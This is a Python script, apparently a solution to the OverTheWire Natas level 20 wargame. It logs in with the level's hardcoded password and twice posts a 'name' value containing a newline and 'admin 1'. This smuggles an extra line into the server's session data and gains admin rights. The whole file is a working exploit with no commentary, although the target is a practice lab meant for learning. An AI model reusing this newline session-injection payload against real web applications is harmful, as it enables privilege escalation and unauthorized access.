import requests
import re

# Credentials for natas20
username = "natas20"
password = "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"

# Target URL
url = "http://natas20.natas.labs.overthewire.org"
##url = "http://natas20.natas.labs.overthewire.org/index.php?debug"

# Start a session to persist cookies and headers across requests
session = requests.Session()

payload = "admin\nadmin 1"

response = session.post(
    url,
    data={"name": payload},
    auth=(username, password)
)

##print(response.text)
##print("*"*80)

response = session.post(
    url,
    data={"name": payload},
    auth=(username, password)
)

print(response.text)
